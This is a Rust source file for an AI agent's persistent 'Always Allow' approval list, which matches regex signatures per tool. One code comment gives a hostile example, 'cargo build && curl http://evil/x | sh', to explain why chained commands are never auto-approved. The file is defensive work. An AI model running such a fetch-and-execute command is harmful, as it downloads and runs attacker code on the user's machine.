//! Persistent user "Always Allow" list.
use std::path::Path;
use std::time::{SystemTime, UNIX_EPOCH};
use regex::Regex;
use serde::{Deserialize, Serialize};

/// One allowlist entry. The pattern is matched against the tool's
/// `signature` (per-tool extracted string — see `extract_trust_signature`),
/// gated by the `tool` field so an entry meant for `write_file` doesn't
/// accidentally match a `terminal` call.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct UserAllowlistEntry {
    /// Tool this entry applies to (e.g. `"terminal"`, `"write_file"`,
    /// `"web_extract"`). Empty string is treated as `"terminal"` for
    /// back-compat with allowlist files written before this field
    /// existed (see `recompile` migration below).
    #[serde(default)]
    pub tool: String,
    /// Regex pattern. Validated at `add` time; recompiled at `load`
    /// time (silently dropped on compile error so a hand-edited file
    /// with one bad entry doesn't break the rest).
    pub pattern: String,
    /// Example call the user approved (informational).
    #[serde(default)]
    pub command_hint: String,
    /// Unix timestamp (seconds since epoch) when the entry was added.
    #[serde(default)]
    pub added_at_unix: u64,
}

/// Persistent user "Always Allow" list.
/// Holds the regex patterns the user has blessed for the `always`
/// tier of the 4-state approval (`once` / `session` / `always` /
/// `deny`). Loaded from disk at agent startup via [`Self::load`] and
/// re-saved on every modification. A missing or corrupt file yields
/// an empty allowlist — load **must not** fail the agent start, by
/// design.
/// The `compiled` cache is kept in sync with `entries` at all times
/// (skip-serialized so the JSON only stores the source patterns;
/// recompiled lazily on `load`).
#[derive(Debug, Clone, Default)]
pub struct UserAllowlist {
    entries: Vec<UserAllowlistEntry>,
    /// Compiled patterns, parallel to `entries`. Recomputed by
    /// `recompile()` after `load()`. `#[serde(skip)]` would be nice
    /// but `UserAllowlist` itself isn't `Serialize` — only the
    /// `entries` are written to disk.
    compiled: Vec<Regex>,
}

impl UserAllowlist {
    /// Create an empty allowlist. Use [`Self::load`] for the
    /// disk-backed constructor.
    pub fn new() -> Self {
        Self::default()
    }

    /// Add a regex pattern bound to a specific `tool`. Compiles it;
    /// returns an error if invalid (the entry is **not** added in
    /// that case — the caller can decide to drop, log, or surface
    /// to the user). `command_hint` is informational; it shows up in
    /// the allowlist list output and is **not** consulted at match
    /// time.
    pub fn add_entry(
        &mut self,
        tool: &str,
        pattern: &str,
        command_hint: &str,
    ) -> Result<(), regex::Error> {
        let re = Regex::new(pattern)?;
        self.entries.push(UserAllowlistEntry {
            tool: tool.to_string(),
            pattern: pattern.to_string(),
            command_hint: command_hint.to_string(),
            added_at_unix: SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0),
        });
        self.compiled.push(re);
        Ok(())
    }

    /// Back-compat: add a regex pattern with `tool = "terminal"`.
    /// The pre-`tool`-field allowlist files only ever stored terminal
    /// patterns, so the default is unambiguous for the legacy
    /// `add(pattern, hint)` signature.
    pub fn add(
        &mut self,
        pattern: &str,
        command_hint: &str,
    ) -> Result<(), regex::Error> {
        self.add_entry("terminal", pattern, command_hint)
    }

    /// Convenience: add an exact-match entry (escaped to `^<value>$`)
    /// for a literal value of a given tool. This is what the WS
    /// "Always Allow" UI calls. Idempotent: re-granting the same
    /// `(tool, value)` pair is a no-op, because the WS and REST-fallback
    /// delivery paths can both reach this for one user click.
    pub fn add_literal_for(
        &mut self,
        tool: &str,
        value: &str,
        hint: &str,
    ) -> Result<(), regex::Error> {
        let pattern = format!("^{}$", regex::escape(value));
        if self.entries.iter().any(|e| e.tool == tool && e.pattern == pattern) {
            return Ok(());
        }
        self.add_entry(tool, &pattern, hint)
    }

    /// Back-compat: add a literal command (assumes `tool = "terminal"`).
    pub fn add_literal(&mut self, command: &str) -> Result<(), regex::Error> {
        self.add_literal_for("terminal", command, command)
    }

    /// Remove by `(tool, pattern)` pair — both must match exactly.
    /// Returns `true` if an entry was removed.
    pub fn remove_entry(&mut self, tool: &str, pattern: &str) -> bool {
        if let Some(pos) = self
            .entries
            .iter()
            .position(|e| e.tool == tool && e.pattern == pattern)
        {
            self.entries.remove(pos);
            self.compiled.remove(pos);
            true
        } else {
            false
        }
    }

    /// Back-compat: remove by exact pattern match (assumes terminal).
    pub fn remove(&mut self, pattern: &str) -> bool {
        self.remove_entry("terminal", pattern)
    }

    /// Iterate entries (read-only).
    pub fn iter(&self) -> impl Iterator<Item = &UserAllowlistEntry> {
        self.entries.iter()
    }

    /// Number of entries currently held.
    pub fn len(&self) -> usize {
        self.entries.len()
    }

    /// True if no entries are present.
    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    /// Check if any entry for `tool` matches `signature` against its
    /// compiled pattern. Returns `false` when there are no entries
    /// for that tool.
    pub fn matches(&self, tool: &str, signature: &str) -> bool {
        self.entries
            .iter()
            .zip(self.compiled.iter())
            .any(|(e, re)| e.tool == tool && re.is_match(signature))
    }

    /// Load from a JSON file. Behavior matrix:
    /// | File state             | Result                              |
    /// |------------------------|-------------------------------------|
    /// | Missing                | `Self::new()` (no warning)          |
    /// | Empty                  | `Self::new()` (no warning)          |
    /// | Valid JSON array       | populated, recompiled               |
    /// | Corrupt JSON           | `Self::new()` + warning to stderr   |
    /// | Permission denied      | `Self::new()` + warning to stderr   |
    /// Load is **never** fatal: a corrupt or unreadable file must
    /// not stop the agent from starting. The user can rebuild the
    /// allowlist by re-clicking "Always Allow" on the relevant
    /// prompts.
    pub fn load(path: &Path) -> Self {
        let bytes = match std::fs::read(path) {
            Ok(b) => b,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Self::new(),
            Err(e) => {
                eprintln!(
                    "[hermix-approval] allowlist read error ({}); starting with empty allowlist",
                    e
                );
                return Self::new();
            }
        };
        if bytes.is_empty() {
            return Self::new();
        }
        match serde_json::from_slice::<Vec<UserAllowlistEntry>>(&bytes) {
            Ok(entries) => {
                let mut al = Self {
                    entries,
                    compiled: Vec::new(),
                };
                al.recompile();
                al
            }
            Err(e) => {
                eprintln!(
                    "[hermix-approval] allowlist parse error ({}); starting with empty allowlist",
                    e
                );
                Self::new()
            }
        }
    }

    /// Persist to a JSON file (atomic via tmp + rename). Creates the
    /// parent directory if missing. On Windows, the target file is
    /// removed before rename because `std::fs::rename` fails if the
    /// target exists (POSIX rename atomically replaces).
    pub fn save(&self, path: &Path) -> std::io::Result<()> {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let bytes = serde_json::to_vec_pretty(&self.entries)
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
        let tmp = path.with_extension("json.tmp");
        std::fs::write(&tmp, &bytes)?;
        // On Windows, std::fs::rename fails if the target exists.
        // POSIX rename atomically replaces, so the remove is
        // Windows-only.
        #[cfg(windows)]
        {
            if let Err(e) = std::fs::remove_file(path) {
                if e.kind() != std::io::ErrorKind::NotFound {
                    tracing::warn!(
                        path = %path.display(),
                        error = %e,
                        "failed to remove file before rename (Windows)"
                    );
                }
            }
        }
        std::fs::rename(&tmp, path)?;
        Ok(())
    }

    /// Recompile all entry patterns. Silently drops entries that
    /// fail to compile — both from `compiled` (so they don't match)
    /// and from `entries` (so the next `save` doesn't write them
    /// back into the file). Entries were validated at `add` time,
    /// so this only matters for hand-edited files; a corrupt entry
    /// should not break the whole allowlist.
    fn recompile(&mut self) {
        let mut kept_entries = Vec::with_capacity(self.entries.len());
        let mut compiled = Vec::with_capacity(self.entries.len());
        for mut e in self.entries.drain(..) {
            // Back-compat migration: allowlist files written before
            // the `tool` field was added have `tool == ""`. The legacy
            // entries were always terminal-side-effect (the only
            // `record_approval_side_effect` call site was for
            // `command` strings), so the empty tool means terminal.
            if e.tool.is_empty() {
                e.tool = "terminal".to_string();
            }
            match Regex::new(&e.pattern) {
                Ok(re) => {
                    compiled.push(re);
                    kept_entries.push(e);
                }
                Err(err) => eprintln!(
                    "[hermix-approval] dropping uncompilable allowlist entry \
                     `{}` ({}): {}",
                    e.pattern, e.command_hint, err
                ),
            }
        }
        self.entries = kept_entries;
        self.compiled = compiled;
    }
}

/// Extract the canonical "signature" of a tool call for the
/// persistent allowlist. Returns a regex pattern string suitable
/// for [`UserAllowlist::add_entry`] (i.e. the same string the
/// `pre_approval_checker` will later match against this tool's
/// `signature`).
///
/// Per-tool rules:
/// - `terminal` / `bash` / `shell` (any `<name>_terminal`) — first word of the
///   command (matches any subcommand/args; e.g. "cargo test"
///   and "cargo build" both hit `^cargo\b.*`).
/// - `write_file` / `patch` / `edit_file` — exact absolute path.
/// - `web_extract` (when carrying a URL) — domain
///   prefix (e.g. `^https?://(?:www\.)?example\.com(/.*)?$`).
/// - Everything else (`web_search` without URL, `memory`,
///   `skills`, ...) — trust the tool name itself, since per-call
///   signatures don't have a natural discriminator.
/// Returns `None` when the params don't carry a usable signature
/// field (caller should skip the auto-approval check rather than
/// synthesize a meaningless broad pattern).
pub fn extract_trust_signature(
    tool: &str,
    params: &serde_json::Value,
) -> Option<String> {
    let t = tool.to_ascii_lowercase();
    let str_param = |k: &str| params.get(k).and_then(|v| v.as_str());
    // Terminal / exec-style: first word of the command.
    let is_terminal = t == "terminal"
        || t == "bash"
        || t == "shell"
        || t.ends_with("_terminal");
    if is_terminal {
        let cmd = str_param("command").or_else(|| str_param("cmd"))?;
        // 链式命令（`&&` / `;` / `|` / 重定向…）不生成前缀签名：
        // `^cargo\b.*` 会把 `cargo build && curl http://evil/x | sh` 一并算作
        // 「已批准」，而真正执行的是链上的第二个命令。返回 `None` 让调用方
        // 跳过自动放行（`ws.rs` 的 pre-tool 检查对 `None` 直接判「未授权」），
        // 这次点击就只对本次生效。
        if super::engine::has_command_chaining(cmd) {
            return None;
        }
        let first = cmd.split_whitespace().next()?;
        if first.is_empty() {
            return None;
        }
        return Some(format!(r"^{}\b.*", regex::escape(first)));
    }
    // File write / patch: exact path match.
    if matches!(t.as_str(), "write_file" | "patch" | "edit_file") {
        let path = str_param("path")?;
        if path.is_empty() {
            return None;
        }
        return Some(format!("^{}$", regex::escape(path)));
    }
    // Web: domain from URL when present.
    if t == "web_extract" {
        if let Some(url) = str_param("url") {
            if let Some(domain) = extract_domain(url) {
                return Some(format!(
                    r"^https?://(?:www\.)?{}(/.*)?$",
                    regex::escape(&domain)
                ));
            }
        }
        // No URL: fall through to tool-name match.
    }
    // web_search / memory / skills / other: trust the tool
    // name itself (narrower than "any call" — restricted to this
    // specific tool).
    Some(format!("^{}$", regex::escape(tool)))
}

/// Extract the host portion of a URL string. Strips scheme, optional
/// `www.` prefix, and trailing path / query / port. Returns `None`
/// for malformed inputs (no scheme, empty host, or non-ASCII host
/// we can't safely regex-anchor).
fn extract_domain(url: &str) -> Option<String> {
    let after = url.splitn(2, "://").nth(1)?;
    let host_end = after
        .find(|c: char| c == '/' || c == ':' || c == '?')
        .unwrap_or(after.len());
    let host = &after[..host_end];
    let host = host.trim_start_matches("www.");
    if host.is_empty() || host.contains(' ') {
        return None;
    }
    Some(host.to_string())
}
